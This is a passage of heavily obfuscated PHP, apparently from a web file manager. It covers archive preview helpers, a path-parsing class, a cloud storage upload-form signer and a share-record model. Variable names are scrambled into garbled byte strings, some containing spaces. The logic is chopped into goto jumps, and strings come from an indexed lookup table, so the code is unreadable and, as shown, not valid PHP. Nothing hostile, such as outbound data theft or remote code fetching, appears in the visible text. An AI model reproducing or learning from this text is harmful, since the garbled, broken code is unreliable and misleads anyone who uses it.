$AÃ˜Û÷ÌÅ®) { show_json(sprintf(LNG($E‘ÖĞôŞ±[1039]), count($b´É›§”Ù°)), !1); } return $b´É›§”Ù°; } } else { $A®—ß­çÆ = self::mkfile($A®—ß­çÆ); } } $E‘®¼©­§¿ = TEMP_FILES . $bªÎøØ´É¿; goto dŒ“‡åàåŠ; FŠÔ×è©©Š: $FÖè‰Î†ˆì = self::iconvSystem($FÖè‰Î†ˆì); if ($A“Ù‚Ë£»â >= 0) { $f­§ˆ¸Ø™¬ = isset($aŞ¤‹¸»Ô„[$E‘ÖĞôŞ±[1041]]) ? $aŞ¤‹¸»Ô„[$E‘ÖĞôŞ±[1041]] : !1; $D¿…—öë¥ = isset($aŞ¤‹¸»Ô„[$E‘ÖĞôŞ±[28]]) ? $aŞ¤‹¸»Ô„[$E‘ÖĞôŞ±[28]] : $E‘ÖĞôŞ±[33]; KodArchive::filePreview($FÖè‰Î†ˆì, $A“Ù‚Ë£»â, $f­§ˆ¸Ø™¬, $D¿…—öë¥); self::archiveExt(); die; } $FëØİÒÀ™ = KodArchive::listContent($FÖè‰Î†ˆì); goto fØ†–ŒÕ´Ï; F‘Š„õÀŸ: } private static function fileExt($Dªğ†ã‰ĞÌ) { $dâÅ„ª¦Š =& $_SERVER[‚Ğ°–—î]; $BÔ‹Ã–ÆÉˆ = $Dªğ†ã‰ĞÌ[$dâÅ„ª¦Š[160]]; if ($BÔ‹Ã–ÆÉˆ == $dâÅ„ª¦Š[1042]) { $Böà•‰˜Şè = $dâÅ„ª¦Š[1043]; if (substr($Dªğ†ã‰ĞÌ[$dâÅ„ª¦Š[28]], -strlen($Böà•‰˜Şè)) == $Böà•‰˜Şè) { $BÔ‹Ã–ÆÉˆ = $dâÅ„ª¦Š[1044]; } } self::archiveExt($BÔ‹Ã–ÆÉˆ); return $BÔ‹Ã–ÆÉˆ; } private static function zipFileList($c­·¡Í††, $F‘ÈŞÑ·©Ğ = false) { $a¦Œ¢œùš =& $_SERVER[‚Ğ°–—î]; $aöôİœ°É¾ = array(); foreach ($c­·¡Í†† as $f…ˆğÅÒ½) { $càò¶åê£ = $f…ˆğÅÒ½[$a¦Œ¢œùš[75]]; if ($F‘ÈŞÑ·©Ğ) { $càò¶åê£ = self::copy($f…ˆğÅÒ½[$a¦Œ¢œùš[75]], $F‘ÈŞÑ·©Ğ, $a¦Œ¢œùš[744]); } if ($càò¶åê£ && self::local()->exist($càò¶åê£)) { $aöôİœ°É¾[$f…ˆğÅÒ½[$a¦Œ¢œùš[75]]] = $càò¶åê£; } } if (!empty($aöôİœ°É¾)) { return array_values($aöôİœ°É¾); } show_json(LNG($a¦Œ¢œùš[1045]), !1); } public static function tmpFileName($cª²ºÁÜ±) { $EŒÇ»¤´ªø =& $_SERVER[‚Ğ°–—î]; $bÎğ…ªÓğ = array($cª²ºÁÜ±[$EŒÇ»¤´ªø[28]], $cª²ºÁÜ±[$EŒÇ»¤´ªø[75]], $cª²ºÁÜ±[$EŒÇ»¤´ªø[77]], $cª²ºÁÜ±[$EŒÇ»¤´ªø[459]]); return md5(implode($EŒÇ»¤´ªø[70], $bÎğ…ªÓğ)); } private static function localFilePath($E­ÔÇ±ª—Ç, $d…¯ª‹ô¨İ) { goto BÛİ¨¨Ã›Ú; E¿ç´Á›ƒš: if ($dÀÛ›¸Ÿ == $A“Î’¸Ì[102] || $dÀÛ›¸Ÿ == $A“Î’¸Ì[1049]) { if (!$F°êÉÔøËå->exist($F°êÉÔøËå->path)) { show_json(LNG($A“Î’¸Ì[101]), !1); } return $F°êÉÔøËå->path; } return !1; goto D‚¹¢¤ñè; bƒ¶´ ãİ¥: if ($F¹œˆÍç¹·[$A“Î’¸Ì[29]] == KodIO::KOD_SOURCE) { $C …³‹Ùˆ = Model($A“Î’¸Ì[752])->fileInfoGet(KodIO::sourceID($E­ÔÇ±ª—Ç)); if (!$C …³‹Ùˆ[$A“Î’¸Ì[75]]) { show_json($A“Î’¸Ì[1048], !1); } $E­ÔÇ±ª—Ç = $C …³‹Ùˆ[$A“Î’¸Ì[75]]; } $F°êÉÔøËå = self::init($E­ÔÇ±ª—Ç); $dÀÛ›¸Ÿ = $F°êÉÔøËå->getType(); goto E¿ç´Á›ƒš; BÛİ¨¨Ã›Ú: $A“Î’¸Ì =& $_SERVER[‚Ğ°–—î]; if ($d…¯ª‹ô¨İ == $A“Î’¸Ì[1046] && strtoupper(substr(PHP_OS, 0, 3)) == $A“Î’¸Ì[1047]) { return !1; } $F¹œˆÍç¹· = KodIO::parse($E­ÔÇ±ª—Ç); goto bƒ¶´ ãİ¥; D‚¹¢¤ñè: } private static function archiveExt($D±¼¼Ş‰Ç = '') { $GLOBALS[$_SERVER[‚Ğ°–—î][1050]] = $D±¼¼Ş‰Ç; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\x75\x72\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\x65\x72\122\145\143\171\143\x6c\x65\175"; const KOD_USER_FAV = "\173\x75\x73\145\162\x46\141\166\175"; const KOD_USER_FILE_TAG = "\173\165\163\x65\162\106\x69\x6c\x65\124\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\162\x46\151\x6c\145\x54\x79\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\157\x75\x70\x52\x6f\157\164\123\x65\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\165\x73\x65\x72\123\x68\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\x72\x53\x68\x61\x72\145\x4c\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\162\x65\x54\x6f\x4d\x65\175"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\x72\145\111\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\141\162\145\x49\164\145\155\x4c\x69\156\153\175"; const KOD_SEARCH = "\x7b\163\x65\141\162\x63\150\x7d"; const KOD_BLOCK = "\x7b\142\154\157\x63\153\x7d"; const KOD_IO = "\x7b\151\x6f\175"; const KOD_USER_RECENT = "\173\x75\163\x65\x72\x52\145\156\x63\145\156\x74\x7d"; const KOD_USER_DRIVER = "\173\144\162\x69\166\145\162\175"; public static function typeList() { $Cªç„‘µ =& $_SERVER[‚Ğ°–—î]; return array($Cªç„‘µ[1051] => self::KOD_SOURCE, $Cªç„‘µ[1052] => self::KOD_USER_RECYCLE, $Cªç„‘µ[1053] => self::KOD_USER_FAV, $Cªç„‘µ[1054] => self::KOD_USER_FILE_TAG, $Cªç„‘µ[1055] => self::KOD_USER_FILE_TYPE, $Cªç„‘µ[1056] => self::KOD_GROUP_ROOT_SELF, $Cªç„‘µ[1057] => self::KOD_USER_SHARE, $Cªç„‘µ[1058] => self::KOD_USER_SHARE_LINK, $Cªç„‘µ[1059] => self::KOD_USER_SHARE_TO_ME, $Cªç„‘µ[1060] => self::KOD_SHARE_ITEM, $Cªç„‘µ[1061] => self::KOD_SHARE_LINK, $Cªç„‘µ[1062] => self::KOD_SEARCH, $Cªç„‘µ[1063] => self::KOD_BLOCK, $Cªç„‘µ[1064] => self::KOD_IO, $Cªç„‘µ[1065] => self::KOD_USER_RECENT, $Cªç„‘µ[1066] => self::KOD_USER_DRIVER); } public static function parse($fœœº™Š¥“) { goto Eôš½äš–’; C¾¯¡¼ã: $fŠÖÇËâÁñ = array($B“ïĞ¹¤¹¡[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $DˆÕ“õœØÅ[$B“ïĞ¹¤¹¡[1071]] = in_array($DˆÕ“õœØÅ[$B“ïĞ¹¤¹¡[29]], $fŠÖÇËâÁñ); return $DˆÕ“õœØÅ; goto Aî“³¨£§; Eôš½äš–’: $B“ïĞ¹¤¹¡ =& $_SERVER[‚Ğ°–—î]; $fœœº™Š¥“ = self::clear($fœœº™Š¥“); $A¤™¡‡ë«õ = array_values(self::typeList()); goto C˜Îß¬Ïİ‰; C˜Îß¬Ïİ‰: preg_match($B“ïĞ¹¤¹¡[1067], $fœœº™Š¥“, $E›¶’†í); $DˆÕ“õœØÅ = array($B“ïĞ¹¤¹¡[388] => !1, $B“ïĞ¹¤¹¡[1068] => !1, $B“ïĞ¹¤¹¡[385] => !1, $B“ïĞ¹¤¹¡[75] => $fœœº™Š¥“, $B“ïĞ¹¤¹¡[1014] => !1, $B“ïĞ¹¤¹¡[1013] => $B“ïĞ¹¤¹¡[33]); if (is_array($E›¶’†í) && count($E›¶’†í) == 5) { $E¯ÛÇÓÚõô = $B“ïĞ¹¤¹¡[1069] . $E›¶’†í[2] . $B“ïĞ¹¤¹¡[315]; if (in_array($E¯ÛÇÓÚõô, $A¤™¡‡ë«õ)) { $DˆÕ“õœØÅ[$B“ïĞ¹¤¹¡[1014]] = $E›¶’†í[1]; $DˆÕ“õœØÅ[$B“ïĞ¹¤¹¡[29]] = $E¯ÛÇÓÚõô; $DˆÕ“õœØÅ[$B“ïĞ¹¤¹¡[1070]] = substr($E¯ÛÇÓÚõô, 1, -1); $DˆÕ“õœØÅ[$B“ïĞ¹¤¹¡[367]] = $E›¶’†í[3]; } $DˆÕ“õœØÅ[$B“ïĞ¹¤¹¡[1013]] = $E›¶’†í[4]; } goto C¾¯¡¼ã; Aî“³¨£§: } public static function clear($D„ŞÄÁÄ‚ß) { goto E¹ƒùà«Õâ; fà¼æÙ¢´†: $Bœ¢ÑÜŸ£† = $F÷÷ÚõŸç[1072]; if (substr($D„ŞÄÁÄ‚ß, 0, 3) == $F÷÷ÚõŸç[1073]) { $D„ŞÄÁÄ‚ß = substr($D„ŞÄÁÄ‚ß, 3); } while (strstr($D„ŞÄÁÄ‚ß, $Bœ¢ÑÜŸ£†)) { $D„ŞÄÁÄ‚ß = str_replace($Bœ¢ÑÜŸ£†, $F÷÷ÚõŸç[8], $D„ŞÄÁÄ‚ß); } goto a•©ô¹ëÀ°; dé—É¸‹‹®: return $D„ŞÄÁÄ‚ß; goto dòì´İÄ¸ö; a•©ô¹ëÀ°: $D„ŞÄÁÄ‚ß = preg_replace($F÷÷ÚõŸç[1074], $F÷÷ÚõŸç[8], $D„ŞÄÁÄ‚ß); if ($D„ŞÄÁÄ‚ß == $F÷÷ÚõŸç[8]) { return $F÷÷ÚõŸç[8]; } $D„ŞÄÁÄ‚ß = rtrim($D„ŞÄÁÄ‚ß, $F÷÷ÚõŸç[8]); goto dé—É¸‹‹®; E¹ƒùà«Õâ: $F÷÷ÚõŸç =& $_SERVER[‚Ğ°–—î]; $D„ŞÄÁÄ‚ß = str_replace(array($F÷÷ÚõŸç[993], $F÷÷ÚõŸç[217]), $F÷÷ÚõŸç[50], $D„ŞÄÁÄ‚ß); $D„ŞÄÁÄ‚ß = str_replace($F÷÷ÚõŸç[93], $F÷÷ÚõŸç[8], $D„ŞÄÁÄ‚ß); goto fà¼æÙ¢´†; dòì´İÄ¸ö: } public static function sourceID($eÑÓ†˜‰†) { $EµÙÁ·‰æÇ =& $_SERVER[‚Ğ°–—î]; $Cß»åáÄŠÜ = self::parse($eÑÓ†˜‰†); if ($Cß»åáÄŠÜ[$EµÙÁ·‰æÇ[29]] !== self::KOD_SOURCE) { show_json(LNG($EµÙÁ·‰æÇ[1075]), !1); } return $Cß»åáÄŠÜ[$EµÙÁ·‰æÇ[367]]; } public static function make($aÆª•©®»ª) { if (!$aÆª•©®»ª) { return !1; } return self::makePath(self::KOD_SOURCE, intval($aÆª•©®»ª)); } public static function makeShare($D¨Šå³‘ò“, $cêÏ·¬¹™ã) { return self::makePath(self::KOD_SHARE_ITEM, $D¨Šå³‘ò“, $cêÏ·¬¹™ã); } public static function makeFileTypePath($F¸ñ°·†®Ù) { return self::makePath(self::KOD_USER_FILE_TYPE, $F¸ñ°·†®Ù); } public static function makeFileTagPath($F®ï›‘Ÿ Ö) { return self::makePath(self::KOD_USER_FILE_TAG, $F®ï›‘Ÿ Ö); } public static function makePath($B­ìÙëª«, $CÓ¦í›œ” = '', $D‘ çµ¢¾ = '') { $fÙ„ñ¾ë»´ =& $_SERVER[‚Ğ°–—î]; $Eµˆ˜»•†¡ = substr($B­ìÙëª«, 1, -1); $a²Äß¢æåö = $fÙ„ñ¾ë»´[1076] . $Eµˆ˜»•†¡ . $fÙ„ñ¾ë»´[1077] . $CÓ¦í›œ” . $fÙ„ñ¾ë»´[1078]; $a²Äß¢æåö = $D‘ çµ¢¾ ? $a²Äß¢æåö . $D‘ çµ¢¾ . $fÙ„ñ¾ë»´[8] : $a²Äß¢æåö; return $a²Äß¢æåö; } public static function hashPath($eëÅµãİ) { $açóŠÏÍ²± =& $_SERVER[‚Ğ°–—î]; $bô›Š·ììŸ = is_array($eëÅµãİ) ? $eëÅµãİ : IO::info($eëÅµãİ); $dÚœ•¡Ì§š = _get($bô›Š·ììŸ, $açóŠÏÍ²±[1079], $açóŠÏÍ²±[33]); if (!$dÚœ•¡Ì§š) { $a°¦”Ç·á‚ = KodIO::parse($bô›Š·ììŸ[$açóŠÏÍ²±[75]]); if (!$a°¦”Ç·á‚[$açóŠÏÍ²±[29]]) { $dÚœ•¡Ì§š = IO::hashSimple($bô›Š·ììŸ[$açóŠÏÍ²±[75]]); } } if (!$dÚœ•¡Ì§š) { $dÚœ•¡Ì§š = md5($bô›Š·ììŸ[$açóŠÏÍ²±[75]] . $bô›Š·ììŸ[$açóŠÏÍ²±[77]] . $bô›Š·ììŸ[$açóŠÏÍ²±[107]]); } return $dÚœ•¡Ì§š; } public static function initSystemPath() { $fóŞĞ´²ã =& $_SERVER[‚Ğ°–—î]; if (defined($fóŞĞ´²ã[1080])) { return; } define($fóŞĞ´²ã[1080], self::systemPath($fóŞĞ´²ã[1081])); define($fóŞĞ´²ã[1082], self::systemPath($fóŞĞ´²ã[1083])); define($fóŞĞ´²ã[1084], self::systemPath($fóŞĞ´²ã[1085])); define($fóŞĞ´²ã[1086], self::systemPath($fóŞĞ´²ã[1087])); } private static function systemPath($DÌ„ğØË‘Ø) { goto B÷Üâ¯»Â²; e´˜¡ØÚ…Ç: if ($dÉùÕìİÌÃ) { return $dÉùÕìİÌÃ; } if ($DÌ„ğØË‘Ø == $eÔíÂ¦ÏÊ[1081]) { $dÉùÕìİÌÃ = self::make(Model($eÔíÂ¦ÏÊ[752])->systemRootPathAdd($eÔíÂ¦ÏÊ[1090])); } else { $dÉùÕìİÌÃ = self::systemPath($eÔíÂ¦ÏÊ[1081]); $A¦ïÒ±¥¸ = self::sourceID($dÉùÕìİÌÃ); $dÉùÕìİÌÃ = self::make(Model($eÔíÂ¦ÏÊ[752])->mkdir($A¦ïÒ±¥¸, $DÌ„ğØË‘Ø)); } Model($eÔíÂ¦ÏÊ[1089])->set($f÷éõ£Û‘ª, $dÉùÕìİÌÃ); goto C»Ü•˜ëµ; B÷Üâ¯»Â²: $eÔíÂ¦ÏÊ =& $_SERVER[‚Ğ°–—î]; $f÷éõ£Û‘ª = $eÔíÂ¦ÏÊ[1088] . ucfirst($DÌ„ğØË‘Ø); $dÉùÕìİÌÃ = Model($eÔíÂ¦ÏÊ[1089])->get($f÷éõ£Û‘ª); goto e´˜¡ØÚ…Ç; C»Ü•˜ëµ: return $dÉùÕìİÌÃ; goto E§˜ˆÏ»™; E§˜ˆÏ»™: } public static function systemFolder($aíà‘åˆ¾) { $dÙ –·Á•Ü = IO_PATH_SYSTEM_SOURCE . $aíà‘åˆ¾; $eØ§ÓÏ®Ù† = Cache::get($dÙ –·Á•Ü); if (!$eØ§ÓÏ®Ù†) { $aÈˆÉ‹ÒÛ = IO::infoFull($dÙ –·Á•Ü); if (!$aÈˆÉ‹ÒÛ) { $eØ§ÓÏ®Ù† = IO::mkdir($dÙ –·Á•Ü, REPEAT_SKIP); } else { $eØ§ÓÏ®Ù† = $aÈˆÉ‹ÒÛ[$_SERVER[‚Ğ°–—î][75]]; } Cache::set($dÙ –·Á•Ü, $eØ§ÓÏ®Ù†, 3600 * 10); } return $eØ§ÓÏ®Ù†; } public static function defaultDriver() { return Model($_SERVER[‚Ğ°–—î][703])->defaultDriver(); } public static function defaultIO() { $a‘¬…¿ø—± =& $_SERVER[‚Ğ°–—î]; $fÂ©‡ÒÔ” = self::defaultDriver(); return $a‘¬…¿ø—±[1091] . $fÂ©‡ÒÔ”[$a‘¬…¿ø—±[367]] . $a‘¬…¿ø—±[1078]; } public static function defaultDriverInit() { static $c‡³ÉØõ»ƒ = false; if ($c‡³ÉØõ»ƒ) { return $c‡³ÉØõ»ƒ; } $c‡³ÉØõ»ƒ = IO::init(self::defaultIO()); return $c‡³ÉØõ»ƒ; } public static function fileTypeList() { $Eì ›â­œŠ =& $_SERVER[‚Ğ°–—î]; $cÅ´‚ãŒ¶Ó = $GLOBALS[$Eì ›â­œŠ[6]][$Eì ›â­œŠ[1092]]; foreach ($cÅ´‚ãŒ¶Ó as $aó®™Â´Ş† => $Fá¿ÖÂ³òÜ) { $e²ë«Šİ‚¦ = $Eì ›â­œŠ[1093] . $aó®™Â´Ş†; $aË•·Ô×“ = LNG($e²ë«Šİ‚¦); if ($e²ë«Šİ‚¦ != $aË•·Ô×“) { $cÅ´‚ãŒ¶Ó[$aó®™Â´Ş†][$Eì ›â­œŠ[28]] = $aË•·Ô×“; } } return $cÅ´‚ãŒ¶Ó; } public static function transferType($fŞ¸íÉæÖÚ, $A£¾¥‚®¨ó) { goto B–·‰‚¨©£; B–·‰‚¨©£: $A¨ÒŒ——¤± =& $_SERVER[‚Ğ°–—î]; $c½’é²µ·Œ = self::driverType($fŞ¸íÉæÖÚ); $EÆã„÷˜Éµ = self::driverType($A£¾¥‚®¨ó); goto f‚‡ªÏ¸ì³; dÂ„§È÷³ê: return $A¨ÒŒ——¤±[1096]; goto fÂŸŸ«¶Œã; f‚‡ªÏ¸ì³: if ($c½’é²µ·Œ[$A¨ÒŒ——¤±[29]] == $EÆã„÷˜Éµ[$A¨ÒŒ——¤±[29]] && $c½’é²µ·Œ[$A¨ÒŒ——¤±[1094]] == $EÆã„÷˜Éµ[$A¨ÒŒ——¤±[1094]]) { return $A¨ÒŒ——¤±[1095]; } if ($c½’é²µ·Œ[$A¨ÒŒ——¤±[29]] == $A¨ÒŒ——¤±[786] && $EÆã„÷˜Éµ[$A¨ÒŒ——¤±[29]] == $A¨ÒŒ——¤±[102]) { return $A¨ÒŒ——¤±[1041]; } if ($c½’é²µ·Œ[$A¨ÒŒ——¤±[29]] == $A¨ÒŒ——¤±[102] && $EÆã„÷˜Éµ[$A¨ÒŒ——¤±[29]] == $A¨ÒŒ——¤±[786]) { return $A¨ÒŒ——¤±[103]; } goto dÂ„§È÷³ê; fÂŸŸ«¶Œã: } public static function driverType($Báãœêµ) { goto AÀÑ¬Ù÷…; dù´ô‡³ ×: return array($bãµ­®·‡·[29] => $bãµ­®·‡·[786], $bãµ­®·‡·[1094] => $Báãœêµ->pathDriver, $bãµ­®·‡·[75] => $aâ•½•Ö²); goto d¶›ÁÕ¡Õ; AÀÑ¬Ù÷…: $bãµ­®·‡· =& $_SERVER[‚Ğ°–—î]; $aâ•½•Ö² = $Báãœêµ->path; $F‰ñ¢Ú„Ÿ = str_replace($bãµ­®·‡·[1097], $bãµ­®·‡·[33], strtolower($Báãœêµ->getType())); goto FŠ¯…Îµš¾; FŠ¯…Îµš¾: if ($F‰ñ¢Ú„Ÿ == $bãµ­®·‡·[693] || $F‰ñ¢Ú„Ÿ == $bãµ­®·‡·[1098] || $F‰ñ¢Ú„Ÿ == $bãµ­®·‡·[1099]) { $Báãœêµ = self::defaultDriverInit(); } else { if ($F‰ñ¢Ú„Ÿ == $bãµ­®·‡·[1049] || $F‰ñ¢Ú„Ÿ == $bãµ­®·‡·[1100]) { $Báãœêµ = IO::init($Báãœêµ->pathParse[$bãµ­®·‡·[999]]); } } $F‰ñ¢Ú„Ÿ = str_replace($bãµ­®·‡·[1097], $bãµ­®·‡·[33], strtolower($Báãœêµ->getType())); if ($F‰ñ¢Ú„Ÿ == $bãµ­®·‡·[102]) { return array($bãµ­®·‡·[29] => $bãµ­®·‡·[102], $bãµ­®·‡·[1094] => $bãµ­®·‡·[33], $bãµ­®·‡·[75] => $aâ•½•Ö²); } goto dù´ô‡³ ×; d¶›ÁÕ¡Õ: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($dÖŠ±©†‰­) { parent::__construct($dÖŠ±©†‰­); $this->signatureVersion($_SERVER[‚Ğ°–—î][200]); } public function uploadFormData($D¶Â†ôÆŠÌ, $f†ß«”ÌÖÈ = 3600) { goto fõËÀÓß–Ÿ; dÃÑì‡»éæ: $fÇèäª‘ñµ = $Aˆ··åÜ¿Í[1101]; $a÷¿ÎÈ‡Ò = gmdate($Aˆ··åÜ¿Í[1102], time() + $f†ß«”ÌÖÈ); $cùëË¡¬Ó” = (string) time() . $Aˆ··åÜ¿Í[67] . (string) (time() + $f†ß«”ÌÖÈ); goto eãŞ¢¶Ô™; f‰—ç‹Ä¬¯: return $fŒî¬¼ÌŒ; goto DèÍ»¿”…; eãŞ¢¶Ô™: $d¯óËÄ¯ó = array($Aˆ··åÜ¿Í[1103] => $a÷¿ÎÈ‡Ò, $Aˆ··åÜ¿Í[1104] => array(array($Aˆ··åÜ¿Í[1105] => $CÚÄ¬‚÷®), array($Aˆ··åÜ¿Í[1106] => $this->bucket), array($Aˆ··åÜ¿Í[1107], $Aˆ··åÜ¿Í[1108], $Aˆ··åÜ¿Í[33]), array($Aˆ··åÜ¿Í[1109] => $fÇèäª‘ñµ), array($Aˆ··åÜ¿Í[1110] => $CÔ„—¶¹ì), array($Aˆ··åÜ¿Í[1111] => $this->accessKey), array($Aˆ··åÜ¿Í[1112] => $cùëË¡¬Ó”))); $d¯óËÄ¯ó = json_encode($d¯óËÄ¯ó); $dªÂ‰À‰£• = hash_hmac($Aˆ··åÜ¿Í[218], $cùëË¡¬Ó”, $this->secret); goto aöÍ©øå†Š; aöÍ©øå†Š: $Eè³‡¹§ºè = sha1($d¯óËÄ¯ó); $F÷ƒ–õ²ÀÒ = hash_hmac($Aˆ··åÜ¿Í[218], $Eè³‡¹§ºè, $dªÂ‰À‰£•); $fŒî¬¼ÌŒ = array($Aˆ··åÜ¿Í[1105] => $CÚÄ¬‚÷®, $Aˆ··åÜ¿Í[1109] => $fÇèäª‘ñµ, $Aˆ··åÜ¿Í[1113] => base64_encode($d¯óËÄ¯ó), $Aˆ··åÜ¿Í[1110] => $CÔ„—¶¹ì, $Aˆ··åÜ¿Í[1111] => $this->accessKey, $Aˆ··åÜ¿Í[1114] => $cùëË¡¬Ó”, $Aˆ··åÜ¿Í[1115] => $F÷ƒ–õ²ÀÒ, $Aˆ··åÜ¿Í[169] => $this->getHost()); goto f‰—ç‹Ä¬¯; fõËÀÓß–Ÿ: $Aˆ··åÜ¿Í =& $_SERVER[‚Ğ°–—î]; $CÚÄ¬‚÷® = $Aˆ··åÜ¿Í[185]; $CÔ„—¶¹ì = $Aˆ··åÜ¿Í[218]; goto dÃÑì‡»éæ; DèÍ»¿”…: } public function fileOutLink($B·éí¹Š²Ö) { $Aæˆ’Î’ªÄ =& $_SERVER[‚Ğ°–—î]; if (substr($B·éí¹Š²Ö, 0, 7) == $Aæˆ’Î’ªÄ[1116]) { $B·éí¹Š²Ö = $Aæˆ’Î’ªÄ[1117] . substr($B·éí¹Š²Ö, 7); } header($Aæˆ’Î’ªÄ[156] . $B·éí¹Š²Ö); die; } } goto e ¦‹¡¸È; BŠ¢†…ùœ©: class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\x72\x65"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\x54\151\155\x65", "\164\x69\155\x65", "\151\x6e\x73\145\162\164\x2c\x75\160\x64\x61\164\x65", "\146\x75\x6e\143\x74\151\157\156"), array("\x63\162\145\141\164\145\x54\x69\x6d\x65", "\164\151\155\145", "\x69\156\163\145\162\x74", "\x66\165\x6e\x63\164\151\x6f\x6e"), array("\157\160\164\151\x6f\x6e\163", '', "\x69\x6e\x73\145\162\x74\x2c\165\160\x64\141\x74\x65\x2c\x73\145\x6c\x65\143\x74", "\152\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($bĞÃçïÔé) { $D¾Áó¦æœ« =& $_SERVER[‚Ğ°–—î]; $Cˆ•½»Æó = isset($bĞÃçïÔé[0]) ? $bĞÃçïÔé[0] : !1; return array($D¾Áó¦æœ«[2212] => array(USER_ID, $D¾Áó¦æœ«[2213]), $D¾Áó¦æœ«[2175] => array($Cˆ•½»Æó, $D¾Áó¦æœ«[2214])); } protected function listSimple() { $d¾Û‹‹Ò¬ = array($_SERVER[‚Ğ°–—î][1438] => USER_ID); $Cõ–¬„š½» = $this->field($this->fieldList)->where($d¾Û‹‹Ò¬)->select(); return $Cõ–¬„š½» ? $Cõ–¬„š½» : array(); } protected function getInfo($a¢—ÅÇ½è, $DÃ¶‰ø¿¿ó = false) { $b«óñ³ˆÌó =& $_SERVER[‚Ğ°–—î]; if ($DÃ¶‰ø¿¿ó) { return $this->_getShareInfo(array($b«óñ³ˆÌó[441] => $a¢—ÅÇ½è)); } $F”çö§Ñˆï = $this->cacheFunctionGet($b«óñ³ˆÌó[2215], $a¢—ÅÇ½è); return $F”çö§Ñˆï; } public function getInfoByHash($e çİ”¼™Š) { return $this->_getShareInfo(array($_SERVER[‚Ğ°–—î][443] => $e çİ”¼™Š)); } public function getInfoByPath($Dãñ²­ñ’‹) { $DË¥ôÎ„Ö =& $_SERVER[‚Ğ°–—î]; $e´öÇ–¯… = array($DË¥ôÎ„Ö[1438] => USER_ID, $DË¥ôÎ„Ö[369] => $Dãñ²­ñ’‹); return $this->_getShareInfo($e´öÇ–¯…); } public function getInfoBySourcePath($aìŒ¸‡ˆßˆ) { $D¬©®ÕÄÆí =& $_SERVER[‚Ğ°–—î]; $eóÂ¦ˆ†ƒÇ = array($D¬©®ÕÄÆí[1438] => USER_ID, $D¬©®ÕÄÆí[1020] => $aìŒ¸‡ˆßˆ); return $this->_getShareInfo($eóÂ¦ˆ†ƒÇ); } private function _getShareInfo($Bğ’½Ÿ»²´) { goto bƒÇ”·Õóƒ; E‡¦ î…ƒ¿: $Bğ’½Ÿ»²´ = array($fôÙĞĞ¼¨[441] => $fßµ—ÇŒ‚¥[$fôÙĞĞ¼¨[441]]); $bÒ†–é»°Ü = $fôÙĞĞ¼¨[2216]; $BøÖ¶™ÓÀª = Model($fôÙĞĞ¼¨[537])->order($fôÙĞĞ¼¨[367])->field($bÒ†–é»°Ü)->where($Bğ’½Ÿ»²´)->select(); goto eîÓ­½½…; bƒÇ”·Õóƒ: $fôÙĞĞ¼¨ =& $_SERVER[‚Ğ°–—î]; $fßµ—ÇŒ‚¥ = $this->where($Bğ’½Ÿ»²´)->find(); if (!$fßµ—ÇŒ‚¥) { return !1; } goto E‡¦ î…ƒ¿; eîÓ­½½…: if ($fßµ—ÇŒ‚¥[$fôÙĞĞ¼¨[369]] == $fôÙĞĞ¼¨[468]) { $fßµ—ÇŒ‚¥[$fôÙĞĞ¼¨[391]] = IO::info($fßµ—ÇŒ‚¥[$fôÙĞĞ¼¨[1020]]); } else { $fßµ—ÇŒ‚¥[$fôÙĞĞ¼¨[391]] = Model($fôÙĞĞ¼¨[1118])->pathInfo($fßµ—ÇŒ‚¥[$fôÙĞĞ¼¨[369]]); } $fßµ—ÇŒ‚¥[$fôÙĞĞ¼¨[2217]] = $BøÖ¶™ÓÀª; return $fßµ—ÇŒ‚¥; goto B¾ØÄÌİ±; B¾ØÄÌİ±: } protected function getInfoAuth($eºŞï¤áá‘) { $C­Ö¡ÊÊÑ­ =& $_SERVER[‚Ğ°–—î]; $D°°ù’·ã‰ = $this->getInfo($eºŞï¤áá‘); $D°°ù’·ã‰[$C­Ö¡ÊÊÑ­[376]] = Model($C­Ö¡ÊÊÑ­[454])->authMake($D°°ù’·ã‰[$C­Ö¡ÊÊÑ­[2217]]); return $D°°ù’·ã‰; } protected function listData($AÍáâù¥¡ = null, $fò°Äî©õ = 300) { $có÷š‘‘Ÿ¿ =& $_SERVER[‚Ğ°–—î]; $aÖµÖÆ÷ïŞ = array(array($có÷š‘‘Ÿ¿[446] => array($có÷š‘‘Ÿ¿[927], 0), $có÷š‘‘Ÿ¿[448] => array($có÷š‘‘Ÿ¿[927], 0), $có÷š‘‘Ÿ¿[2218] => $có÷š‘‘Ÿ¿[2187])); if ($AÍáâù¥¡ == $có÷š‘‘Ÿ¿[1872]) { $aÖµÖÆ÷ïŞ = array($có÷š‘‘Ÿ¿[446] => 1); } else { if ($AÍáâù¥¡ == $có÷š‘‘Ÿ¿[1009]) { $aÖµÖÆ÷ïŞ = array($có÷š‘‘Ÿ¿[448] => 1); } } $aÖµÖÆ÷ïŞ[$có÷š‘‘Ÿ¿[1438]] = USER_ID; $a—Æ¤£¦ÌÈ = $this->where($aÖµÖÆ÷ïŞ)->selectPage($fò°Äî©õ); return $a—Æ¤£¦ÌÈ; } protected function listToMe($fŠä§ØÕÛ = 300) { goto f·£•˜±éÇ; f·£•˜±éÇ: $aš˜®’Õ´â =& $_SERVER[‚Ğ°–—î]; $cé”ì·ºÆ = Session::get($aš˜®’Õ´â[2219]); $c°©–³¾Å· = array_to_keyvalue($cé”ì·ºÆ, $aš˜®’Õ´â[33], $aš˜®’Õ´â[2107]); goto f±ñÇŸÁˆÒ; còíÏÄğÙÈ: $D‰£ñ‚™Ö = array($aš˜®’Õ´â[2221] => $B£„õœ†ŠÈ, $aš˜®’Õ´â[2222] => $d®‡íí—¯÷[$aš˜®’Õ´â[351]]); return $D‰£ñ‚™Ö; goto 